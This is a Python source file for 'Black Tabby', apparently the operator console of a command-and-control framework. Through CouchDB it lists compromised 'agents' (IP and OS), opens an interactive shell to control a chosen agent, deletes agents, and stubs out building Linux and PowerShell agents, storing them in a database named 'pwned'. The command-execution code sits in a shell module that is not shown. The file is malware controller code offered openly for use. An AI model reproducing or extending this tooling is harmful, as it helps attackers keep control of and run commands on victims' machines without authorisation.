from __future__ import print_function, unicode_literals
import json
import couchdb
import pyfiglet
from colorama import Fore, Back, Style
from PyInquirer import style_from_dict, Token, prompt, Separator
from examples import custom_style_2,custom_style_1,custom_style_3
import sys
from shell import Shell
import requests
import time

class Client(object):
	def cat_banner(self):
		print(Style.BRIGHT)
		print(Fore.RED + '''
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmhhyhdmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNy:``  ``.+dNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNm/          .yNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN/ .`       .``hNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNs `ys`-:/:`-h/ .mNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNm.  `-ssymso+.   oNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNmdmNNNmdmNNNm+    /y-/d--m    `hNNNNmmNNNmdmNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNs`./sdmo/:/:.     .ymdomd+     `-//+ymdy/.`oNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNy .:..:yho-     `+y-/y+h.+y-     -sdy/..:` sNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNm .Ndy:..+hy:`  `/- `` ` `/-  `:yho-`-sdN. hNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNN``NNNNdo.`:yy/.``........```/yy/`.+hmNNN. dNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNd -NNNNNNdo. -ohyyyyyyyhdhyyys- .odNNNNNN. hNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNy `mNNNNNNmh-  ..``   -ys.`..  -dNNNNNNNm` sNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNm. /mNNmds:.`       `oh:        .+hmNNNN+ `dNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNy  smy/`         `/ho`            -odNh  sNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNm` .-           -yh:                `o:  mNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNN.       ```..-oms`                     `NNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNm`   `/oydmmNNNNmho`         `           mNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNh    oNNNNNNNNNNNNN:        odh/         sNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNN+    +NNNNNNNNNNNNm`       `mNNh         /NNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNN+    .mNNNNNNNNNNN/         ./:`         /NNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNh     .smNNNNNNds-                       yNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNN+      omo//-`                         /NNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNm:   .hd:        -syys.               -mNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNm: :dy`          .:/.               -mNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNmmddddddddddsm+             +o`             `/hdddddddddmmNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNmmmmmdddhhhyyyy+.          :/::/-          ./syyyhhhdddmmmmmNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNmmmmmdddmmmmNmho/.                  .:ohmNmmmmdddmmmmmmNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNmmmNNNNNNNNNNNmmds:`          `:sdmmNNNNNNNNNNNmmmNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNms.-:/osydmNNNNNmh:        -hmNNNNNmhyyssoosmNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNd/    ./ `.sNNNNNNmhyshhyyhmNNNNNd-.`:/    .smNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNmh/.     `ymy+NNdmNNNNNNNdyNN+ymh.      `:ymNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNdy+-.ohy-./hs-hNy/NNddd-oh+`-syo``./sdmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmdNNd/hh:./yo.yNy-hNdsddh:hNNhhmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNy:dm:.+o+`sNd-sNmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmy:dNo`oo/.:dd:yNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNy+hh/-+mmNh-hNy.oy/.:hdsmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNmmddddhys+.`ods-dNNmmNNsyNd-sho..shsyNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNmy/-``` `+dmydNNmmNNNNNNNNNmmNNsymh.-+sydddmmmNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNmd-  :hNNNNNNNNNNNNNNNNNNNNNNNNNNhmmy-``..:/yNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN..smNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNms. `hmNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmomNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmo.dNNNNNNNNNNNNNNNNNNNNNNNNNNNN
			''')


	def author(self):
		print(Style.BRIGHT)
		print(Fore.WHITE + '''
		Tool	:: Black Tabby
		Author  :: Latortuga71
		Twitter :: @chriswoofmane
		Blog    :: http://chrisja.info
		Github  :: https://github.com/latortuga71/Black_Tabby
		Version :: 1.0
			''')
		print(Style.RESET_ALL)


	def banner(self):
	    print("\n\n")
	    result = pyfiglet.figlet_format("BlackTabby", font = "gothic") # lean/alligator/hollywood/gothic
	    print(Style.BRIGHT)
	    print(Fore.RED + result)
	    print(Style.RESET_ALL)

	def connect_database(self):
		questions = [
		    {
		        'type': 'input',
		        'name': 'username',
		        'message': 'Enter Username'
		    },
		    {
		        'type': 'password',
		        'name': 'password',
		        'message': 'Enter Password'
		    },
		    {
		        'type': 'input',
		        'name': 'ip',
		        'message': 'Enter IP',
		    },
		    {
		    	'type':'input',
		    	'name':'port',
		    	'message': 'Enter Port'

		    }
		]

		answers = prompt(questions, style=custom_style_1)
		#print(answers)
		print(Style.RESET_ALL)
		self.couchserver = couchdb.Server("http://{}:{}@{}:{}".format(answers['username'],answers['password'],answers['ip'],answers['port']))
		if (self.couchserver):
			print(Style.BRIGHT)
			print( Fore.GREEN + "*** Connection Success ***")
			print(Style.RESET_ALL)
		else:
			print(Style.BRIGHT)
			print(Fore.RED + "!!! Error Connecting to database confirm the couch db docker container is running !!!")
			print(Style.RESET_ALL)
			sys.exit(1)
		if 'pwned' not in self.couchserver:
			print(Style.BRIGHT)
			print(Fore.RED + "*** Pwned database not found. ***")
			print(Fore.RED + "*** Creating database now... ***")
			print(Style.RESET_ALL)
			self.couchserver.create('pwned')
			print(Style.BRIGHT)
			print(Fore.GREEN + "*** Successfully Created pwnd DB... ***")
			print(Style.RESET_ALL)
			self.db = self.couchserver['pwned']
			print(Style.BRIGHT)
			print(Fore.YELLOW + "Attempting to create view")
			print(Style.RESET_ALL)
			view = self.create_view(answers['username'],answers['password'],answers['ip'],answers['port'])
			if view:
				print(Style.BRIGHT)
				print(Fore.GREEN + "*** Created View ***")
				print(Style.RESET_ALL)
			else:
				print(Style.BRIGHT)
				print(Fore.RED + "Failed to create View")
				print(Style.RESET_ALL)

		else:
			print(Style.BRIGHT)
			print(Fore.GREEN + "*** Success pwned DB Found ***")
			print(Style.RESET_ALL)
			self.db = self.couchserver['pwned']






	def MainMenuQuestions(self):
	    questions = [
	        {
	            'type': 'list',
	            'name': 'Section',
	            'message': 'Choose From the Options Below',
	            'choices': [
	                'List Agents',
	                'Connect To Agent',
	                'Delete Agent',
	                'Create Agent',
	                'Exit'
	            ]
	        }
	    ]
	    answers = prompt(questions, style=custom_style_3)
	    return answers

	def create_view(self,username,password,ip,port):
		try:
			data = open('doc_view.js','rb').read()
			resp = requests.put("http://{}:{}@{}:{}/pwned/_design/list_agents".format(username,password,ip,port),data=data)
			return True
		except:
			print("Error Creating View")
			return False




	def MainMenuAnswers(self,argument):
	    ## this function decides what function to run based on first menu questions function input
	    ## this basically acts as a switch statement for the functions listed in the main menu
	    switcher = {
	        "List Agents": self.list_slaves,
	        "Connect To Agent": self.cmd_slave,
	        "Delete Agent": self.del_agent,
	        "Create Agent": self.create_agent,
	        "Exit": self.exit
	    }
	    # Get the function from switcher dictionary
	    func = switcher.get(argument)
	    # Execute the function
	    return func()

	def list_slaves(self):
		print(Style.BRIGHT)
		print(Fore.WHITE + "      ****** Agent List ******")
		print(Style.RESET_ALL)
		counter = 0
		self.agent_list = []
		if self.db.view('list_agents/agent'):
			for x in self.db.view('list_agents/agent'):
				counter +=1
				self.agent_list.append(x.id)
				#y = x.value 
				#print(x.value) 
				#ip = json.loads(y['IP'])
				print(Style.BRIGHT)
				print(Fore.YELLOW +"### ===========  #{} ============ ###".format(counter))
				print(Fore.YELLOW + "ID: ",x.id)
				print(Fore.YELLOW +"IP: ",x.value['IP'])
				print(Fore.YELLOW+ "OS: ",x.value['OS']) 
			print(Style.RESET_ALL)
			return True
		else:
			print(Style.BRIGHT)
			print(Fore.YELLOW + "*** No Agents Available ***")
			print(Style.RESET_ALL)
			return False
			

	def cmd_slave(self):
		if self.list_slaves():		
			#print(self.agent_list)
			questions = [{'type':'list','name':'agent_listing','message':'choose agent','choices':self.agent_list}]	
			answers = prompt(questions,style=custom_style_3)
			#print(answers)
			self.agent_id = answers['agent_listing']
			self.controlling_agent(self.agent_id)
			return self.agent_id
		else:
			return


	def controlling_agent(self,agent_id):
		#print(agent_id)
		shell = Shell() ### check shell.py
		shell.agent_id = agent_id
		shell.db_connection = self.db
		shell.cmdloop()



	def del_agent(self):
		if self.list_slaves():
			print(self.agent_list)
			questions = [{'type':'list','name':'agent_listing','message':'Choose Agent To Delete','choices':self.agent_list}]
			answers = prompt(questions,style=custom_style_3)
			doc = self.db[answers['agent_listing']]
			self.db.delete(doc)
			print(Fore.GREEN + "*** Successfully Deleted Agent ***")
			print(Style.RESET_ALL)
			return True
		else:
			print(Fore.YELLOW + "*** No Agents Available ***")
			print(Style.RESET_ALL)
			return False



	def create_agent(self):
		questions = {'type':'list',
					 'name':'Section',
					 'message': 'Choose an agent to build',
					 'choices':['Python (Linux Elf)','Windows PowerShell']}
		answers = prompt(questions, style=custom_style_1)
		print("Creating Agent..")

	def exit(self):
		print(Style.RESET_ALL)
		print("exit")
		sys.exit(0)





	def main(self):
		cli = Client()
		cli.banner()
		time.sleep(1)
		cli.cat_banner()
		time.sleep(1)
		cli.author()
		cli.connect_database()
		while True:
			self.answer = cli.MainMenuQuestions()
			cli.MainMenuAnswers(self.answer['Section'])


if __name__ == "__main__":
	Client().main()